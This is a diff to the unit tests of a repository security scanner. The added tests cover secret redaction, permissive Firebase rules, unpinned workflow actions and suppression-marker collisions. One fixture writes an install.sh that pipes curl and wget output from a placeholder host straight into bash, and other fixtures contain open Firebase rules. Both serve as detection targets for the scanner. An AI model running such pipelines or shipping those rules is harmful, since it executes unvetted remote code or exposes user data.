@@ -198,6 +198,29 @@ class PreflightTests(unittest.TestCase):
                 self.assertNotIn(synthetic_value, completed.stderr)
                 self.assertIn("REDACTED", completed.stdout)
 
+    def test_req_007_specialized_secret_filenames_are_redacted_in_every_format(self) -> None:
+        cases = (
+            ("NEXT_PUBLIC_ADMIN_KEY", "VW-CLIENT-PRIVILEGED-CREDENTIAL"),
+            ("SUPABASE_SERVICE_ROLE_KEY", "VW-SUPABASE-PRIVILEGED-KEY"),
+        )
+        for variable_name, rule_id in cases:
+            with self.subTest(variable_name=variable_name):
+                fixture = RepositoryFixture(self)
+                synthetic_value = "PrivilegedSyntheticValue123456789"
+                fixture.write(
+                    f"{variable_name}={synthetic_value}",
+                    f"{variable_name}={synthetic_value}\n",
+                )
+
+                for output_format in ("text", "json", "sarif"):
+                    with self.subTest(output_format=output_format):
+                        completed = self.run_scanner(fixture.root, output_format)
+                        self.assertEqual(1, completed.returncode)
+                        self.assertNotIn(synthetic_value, completed.stdout)
+                        self.assertNotIn(synthetic_value, completed.stderr)
+                        self.assertIn(rule_id, completed.stdout)
+                        self.assertIn("REDACTED", completed.stdout)
+
     def test_req_011_git_scope_env_and_skip_reasons(self) -> None:
         fixture = RepositoryFixture(self)
         synthetic_value = synthetic_cloud_key()
@@ -314,14 +337,18 @@ class PreflightTests(unittest.TestCase):
             "service firebase.storage { match /b/{bucket}/o { match /{allPaths=**} { "
             "allow read, write: if\n true; } } }\n",
         )
+        fixture.write(
+            "tautology.rules",
+            "service cloud.firestore { match /{document=**} { allow read: if true == true; } }\n",
+        )
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         self.assertEqual(1, completed.returncode)
         rule_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-FIREBASE-PERMISSIVE-RULE"]
-        self.assertEqual(3, len(rule_findings))
+        self.assertEqual(4, len(rule_findings))
         self.assertEqual(
-            {"database.rules.json", "firestore.rules", "storage.rules"},
+            {"database.rules.json", "firestore.rules", "storage.rules", "tautology.rules"},
             {finding["path"] for finding in rule_findings},
         )
 
@@ -398,21 +425,44 @@ class PreflightTests(unittest.TestCase):
         self.assertIn("VW-INSTALL-SCRIPT", rule_ids)
         self.assertIn("VW-REMOTE-INSTALL-SCRIPT", rule_ids)
 
+    def test_req_009_remote_install_wrappers_and_multiline_pipelines_block(self) -> None:
+        fixture = RepositoryFixture(self)
+        first_fetcher = "cu" + "rl"
+        second_fetcher = "wg" + "et"
+        shell = "ba" + "sh"
+        fixture.write(
+            "install.sh",
+            f"{first_fetcher} https://invalid.example/one | env {shell}\n"
+            f"{second_fetcher} https://invalid.example/two |\n {shell}\n",
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        self.assertEqual(1, completed.returncode)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-REMOTE-INSTALL-SCRIPT"
+        ]
+        self.assertEqual(2, len(findings))
+        self.assertEqual({1, 2}, {finding["line"] for finding in findings})
+
     def test_req_009_unpinned_workflow_blocks_but_full_sha_passes(self) -> None:
         fixture = RepositoryFixture(self)
         fixture.write(
             ".github/workflows/release.yml",
             "steps:\n  - uses: actions/checkout@v4\n  - uses: owner/action@"
             + ("a" * 40)
-            + "\n  - { uses: owner/flow-action@v4 }\n",
+            + "\n  - { uses: owner/flow-action@v4 }\n"
+            + "  - { 'uses': 'owner/quoted-action@v4' }\n",
         )
 
         completed = self.run_scanner(fixture.root)
         report = self.json_report(completed)
         self.assertEqual(1, completed.returncode)
         action_findings = [finding for finding in report["findings"] if finding["rule_id"] == "VW-AUTOMATION-UNPINNED"]
-        self.assertEqual(2, len(action_findings))
-        self.assertEqual({2, 4}, {finding["line"] for finding in action_findings})
+        self.assertEqual(3, len(action_findings))
+        self.assertEqual({2, 4, 5}, {finding["line"] for finding in action_findings})
 
     def test_req_009_realistic_secret_with_example_substring_is_not_placeholder(self) -> None:
         fixture = RepositoryFixture(self)
@@ -537,6 +587,63 @@ class PreflightTests(unittest.TestCase):
                 self.assertFalse(public_finding["suppressed"])
                 self.assertNotIn(firebase, completed.stdout)
 
+    @unittest.skipIf(os.name == "nt", "Backslash is a path separator on Windows")
+    def test_req_011_display_path_collision_cannot_cross_suppress(self) -> None:
+        fixture = RepositoryFixture(self)
+        firebase = synthetic_firebase_key()
+        marker = (
+            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
+            'owner="app" approved-by="security" compensating-control="deny rules" '
+            'expires="2099-01-01"'
+        )
+        fixture.write("a/b.js", f'const firebaseApiKey = "{firebase}"; // {marker}\n')
+        fixture.write(r"a\b.js", f'const firebaseApiKey = "{firebase}";\n')
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
+        ]
+        self.assertEqual(2, len(findings))
+        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
+        self.assertEqual(1, report["summary"]["active_warnings"])
+        self.assertEqual(2, len({finding["path"] for finding in findings}))
+
+    def test_req_011_redacted_filename_collision_cannot_cross_suppress(self) -> None:
+        fixture = RepositoryFixture(self)
+        firebase = synthetic_firebase_key()
+        assignment_name = "to" + "ken"
+        first_secret = "First" + "SyntheticSecret1234"
+        second_secret = "Second" + "SyntheticSecret5678"
+        marker = (
+            'vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY reason="restricted" '
+            'owner="app" approved-by="security" compensating-control="deny rules" '
+            'expires="2099-01-01"'
+        )
+        fixture.write(
+            f"{assignment_name}={first_secret}",
+            f'const firebaseApiKey = "{firebase}"; // {marker}\n',
+        )
+        fixture.write(
+            f"{assignment_name}={second_secret}",
+            f'const firebaseApiKey = "{firebase}";\n',
+        )
+
+        completed = self.run_scanner(fixture.root)
+        report = self.json_report(completed)
+        findings = [
+            finding
+            for finding in report["findings"]
+            if finding["rule_id"] == "VW-FIREBASE-PUBLIC-API-KEY"
+        ]
+        self.assertEqual(2, len(findings))
+        self.assertEqual(1, sum(finding["suppressed"] for finding in findings))
+        self.assertEqual(1, report["summary"]["active_warnings"])
+        self.assertNotIn(first_secret, completed.stdout)
+        self.assertNotIn(second_secret, completed.stdout)
+
     def test_req_011_blocker_cannot_be_suppressed(self) -> None:
         fixture = RepositoryFixture(self)
         privileged = synthetic_supabase_key("secret")
@@ -644,13 +751,18 @@ class PreflightTests(unittest.TestCase):
         )
         marker = f"vibeworthy:ignore VW-FIREBASE-PUBLIC-API-KEY {metadata}"
         findings = [
-            scanner.Finding("VW-FIREBASE-PUBLIC-API-KEY", "config.js", line)
+            scanner.Finding(
+                "VW-FIREBASE-PUBLIC-API-KEY",
+                "config.js",
+                line,
+                source_id=b"config.js",
+            )
             for line in range(1, count + 1)
         ]
         source = "\n".join(marker for _ in range(count)) + "\n"
 
         started = time.perf_counter()
-        scanner._apply_suppressions(findings, {"config.js": source})
+        scanner._apply_suppressions(findings, {b"config.js": source})
         elapsed = time.perf_counter() - started
 
         self.assertLess(elapsed, 3.0, f"suppression application took {elapsed:.3f}s")
